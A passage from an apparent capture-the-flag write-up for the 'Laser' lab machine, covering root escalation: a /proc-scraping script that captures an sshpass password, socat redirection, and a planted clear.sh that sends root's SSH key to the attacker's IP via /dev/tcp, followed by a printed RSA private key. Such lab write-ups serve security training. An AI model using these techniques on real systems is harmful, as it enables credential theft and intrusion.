┌──(kac0㉿kali)-[~/htb/laser]
└─$ echo -n zzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzz | wc -c
32
```

I copied the run of 'z's from the output to measure it.  The password was 32 characters long.  I tried logging in with `passwordpasswordpassword`, but no luck...

### Getting root's password

```python
import os
while(1):
  pids = [x for x in os.listdir('/proc') if x.isdigit()]
  for pid in pids:
      if int(pid) > 10000:
        try:
          with open("/proc/%s/cmdline" % pid) as f:
            data = f.read()
        except EnvironmentError as e:
          #print(e)
          pass
        else:
          if data and 'sshpass' in data and 'zzz' not in data:
            print(repr(data))
            print("")
```

I wrote a python script to read each process under `/procs` and check whether it had a `cmdline` file. When that file existed, it scanned the data for the word `sshpass`. If found, it then checked whether the process also held multiple 'z' characters, and if not, it printed the command line that spawned the process.

```text
solr@laser:/dev/shm$ python3 get_pass.py
'sshpass\x00-p\x00c413d115b3d87664499624e7826d8c5a\x00scp\x00/opt/updates/files/graphql-feed\x00root@172.18.0.2:/root/feeds/\x00'
```

After a fairly long wait, I got what I was after. Tidying up the output gave the command:

```text
sshpass -p c413d115b3d87664499624e7826d8c5a scp /opt/updates/files/graphql-feed root@172.18.0.2:/root/feeds/
```

So the password was `c413d115b3d87664499624e7826d8c5a`.

```text
┌──(kac0㉿kali)-[~/htb/laser]
└─$ echo -n c413d115b3d87664499624e7826d8c5a | wc -c                                
32
```

I checked the length of the recovered password to confirm it matched what I'd seen earlier.

### Getting a root shell \(on the container\)

```text
solr@laser:/dev/shm$ ssh root@172.18.0.2
root@172.18.0.2's password: 
Welcome to Ubuntu 20.04 LTS (GNU/Linux 5.4.0-42-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

This system has been minimized by removing packages and content that are
not required on a system that users do not log into.

To restore this content, you can run the 'unminimize' command.
Last login: Sat Dec 19 13:56:50 2020 from 172.18.0.1
root@20e3289bc183:~#
```

With that password and SSH I logged into the docker container as `root`. Then I went for a standard docker container privilege escalation technique: mounting the host's root filesystem into the container.

```text
solr@laser:~$ which docker
/usr/bin/docker
```

First I confirmed the `docker` binary was present on the host \(so I could copy it into the container if needed\).

```text
solr@laser:~$ scp /usr/bin/docker root@172.18.0.2:/dev/shm/docker
root@172.18.0.2's password: 
docker                                                                  0%    0     0.0KB/s   --:-- ETAscp: /dev/shm/docker: No space left on device
docker                                                                100%   81MB 157.6MB/s   00:00
```

Next I tried copying the binary into the container's `/dev/shm` folder, but there wasn't enough space for the file.

```text
root@20e3289bc183:~# df
Filesystem     1K-blocks    Used Available Use% Mounted on
overlay         20508240 8870440  10572996  46% /
tmpfs              65536       0     65536   0% /dev
tmpfs            1017608       0   1017608   0% /sys/fs/cgroup
shm                65536   65536         0 100% /dev/shm
/dev/sda2       20508240 8870440  10572996  46% /etc/hosts
tmpfs            1017608       0   1017608   0% /proc/acpi
tmpfs            1017608       0   1017608   0% /proc/scsi
tmpfs            1017608       0   1017608   0% /sys/firmware
```

Running `df` on the container to check free space, I saw it was only the in-memory space \(`/dev/shm`\) that was full.

```text
solr@laser:~$ scp /usr/bin/docker root@172.18.0.2:/tmp/docker
root@172.18.0.2's password: 
docker
```

Since there was plenty of free space elsewhere on the filesystem, I copied the file to `/tmp` instead.

```text
solr@laser:~$ docker images
Got permission denied while trying to connect to the Docker daemon socket at unix:///var/run/docker.sock: Get http://%2Fvar%2Frun%2Fdocker.sock/v1.40/images/json: dial unix /var/run/docker.sock: connect: permission denied
```

Unfortunately, trying to use this for privilege escalation hit two snags: the service wasn't running in the container, and I couldn't start it because I lacked the privileges to manage containers on the host.

### clear.sh

I revisited the output from my memory-reading script to see if anything else stood out.

```text
'sshpass\x00-p\x00zzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzz\x00ssh\x00root@172.18.0.2\x00/tmp/clear.sh\x00'
```

While running my password-hunting script \(before adding the zzz check\) I noticed another `sshpass` process running a script called `clear.sh` from `/tmp`.  At first I assumed it ran the script inside the container, but on closer inspection there was a `\x00` separator between `root@172.18.0.2` and `/tmp/clear.sh`.  That meant the command logged into the container as root and then executed the `clear.sh` script from the host's `/tmp` folder.

```text
solr@laser:/tmp$ vim /tmp/clear.sh
solr@laser:/tmp$ chmod +x /tmp/clear.sh
```

I looked in `/tmp` to see what the script did, but no such script was there.  That looked like the perfect chance to supply one of my own.  Since the process ran as root \(confirmed via another `ps aux`\), I wrote a script to exfiltrate `root`'s SSH key to my machine.  

```bash
#! /bin/bash

cat /root/.ssh/id_rsa > /dev/tcp/10.10.15.98/9099
```

My bash script was dead simple, just shipping `root`'s SSH key to my machine over TCP sockets

Since the process running `clear.sh` was owned by root and was reaching the container over port 22, and since no `clear.sh` existed in the container's `/tmp`, I needed a way to redirect that connection back to the local machine. That would let me plant my own script for my purposes.  After researching how to forward ports without SSH, I found the simplest approach was `socat`.  

* [https://stackoverflow.com/questions/34791674/socat-port-forwarding-for-https](https://stackoverflow.com/questions/34791674/socat-port-forwarding-for-https)

```text
root@20e3289bc183:/tmp# ./socat -d TCP-LISTEN:22,fork,reuseaddr TCP:172.17.0.1:22
2020/12/19 23:13:20 socat[1919] E bind(5, {AF=2 0.0.0.0:22}, 16): Address already in use
```

With `socat` I tried forwarding port 22 traffic from the container to the host so it would run, but the port was already in use \(by SSH\).

```text
root@20e3289bc183:~# service ssh stop
 * Stopping OpenBSD Secure Shell server sshd                                                     [ OK ]
```

So I stopped the SSH service to free up the port.

```text
solr@laser:/dev/shm$ ssh root@172.18.0.2
@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
@    WARNING: REMOTE HOST IDENTIFICATION HAS CHANGED!     @
@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
IT IS POSSIBLE THAT SOMEONE IS DOING SOMETHING NASTY!
Someone could be eavesdropping on you right now (man-in-the-middle attack)!
It is also possible that a host key has just been changed.
The fingerprint for the ECDSA key sent by the remote host is
SHA256:7+5qUqmyILv7QKrQXPArj5uYqJwwe7mpUbzD/7cl44E.
Please contact your system administrator.
Add correct host key in /var/solr/.ssh/known_hosts to get rid of this message.
Offending ECDSA key in /var/solr/.ssh/known_hosts:1
  remove with:
  ssh-keygen -f "/var/solr/.ssh/known_hosts" -R "172.18.0.2"
Password authentication is disabled to avoid man-in-the-middle attacks.
Keyboard-interactive authentication is disabled to avoid man-in-the-middle attacks.
root@172.18.0.2: Permission denied (publickey,password).
```

At one point while sorting everything out I couldn't SSH in \(it took several tries to get working, since something kept timing out the connection to the container after a short while!\).  Running the command from the error message, `ssh-keygen -f "/var/solr/.ssh/known_hosts" -R "172.18.0.2"`, cleared it and let me log back in.

```text
root@20e3289bc183:~# ./socat -d TCP-LISTEN:22,fork,reuseaddr TCP:172.17.0.1:22
```

The process that executed my malicious `clear.sh` also removed the file afterward, so I had to keep recreating it.  After putting the script back, I restarted the `socat` redirect.

```text
┌──(kac0㉿kali)-[~/htb/laser]
└─$ nc -lvnp 9099
listening on [any] 9099 ...
connect to [10.10.15.98] from (UNKNOWN) [<YOUR_IP>] 38660
-----BEGIN RSA PRIVATE KEY-----
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
-----END RSA PRIVATE KEY-----
```

The SSH key arrived at my waiting listener almost instantly once the `socat` redirect was running!

### Root.txt

```text
┌──(kac0㉿kali)-[~/htb/laser]
└─$ ssh root@<YOUR_IP> -i laser.key
Welcome to Ubuntu 20.04 LTS (GNU/Linux 5.4.0-42-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Sat 19 Dec 2020 11:41:02 PM UTC

  System load:                      0.17
  Usage of /:                       43.7% of 19.56GB
  Memory usage:                     72%
  Swap usage:                       11%
  Processes:                        265
  Users logged in:                  1
  IPv4 address for br-3ae8661b394c: 172.18.0.1
  IPv4 address for docker0:         172.17.0.1
  IPv4 address for ens160:          <YOUR_IP>
  IPv6 address for ens160:          dead:beef::250:56ff:feb9:a0e8

73 updates can be installed immediately.
0 of these updates are security updates.
To see these additional updates run: apt list --upgradable

Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings

Last login: Sat Dec 19 18:36:54 2020 from 10.10.15.98
root@laser:~# cat root.txt 
fbc1************************64c7
root@laser:~# id && hostname
uid=0(root) gid=0(root) groups=0(root)
laser
```
